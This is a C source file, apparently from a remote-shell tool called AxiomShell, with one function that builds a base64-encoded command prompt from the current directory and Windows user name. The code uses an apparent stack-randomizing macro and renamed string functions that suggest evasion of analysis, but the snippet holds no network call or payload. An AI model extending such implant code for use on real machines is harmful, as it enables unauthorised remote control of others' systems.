#include "AxiomShell.h"
#include "Utils.h"
#include "Glibc.h"

#define UN_LEN 256

char* UTILS_get_command_prompt()
{
	STACK_RANDOMIZER;
	size_t size;
	PCHAR currDir;
	CHAR userBuffer[UN_LEN + 1];
	DWORD userBufferSize;
	char* result;
	char *b64result;

	size = GetCurrentDirectory(0, NULL);
	currDir = (PCHAR)malloc(sizeof(CHAR) * size + 1);
	GetCurrentDirectory(size, currDir);

	userBufferSize = UN_LEN + 1;
	GetUserNameA(userBuffer, &userBufferSize);

	result = (char*)malloc(strlen(currDir) + strlen(userBuffer) + 6 + 1);
	drunk_strcpy(result, currDir);
	drunk_strcat(result, " (");
	drunk_strcat(result, userBuffer);
	drunk_strcat(result, ") > ");

	b64result = WRAPPER_base64_encode(result);
	free(result);

	DEBUG_LOG("[+] prompt: %s\n", b64result);
	return (b64result);
}

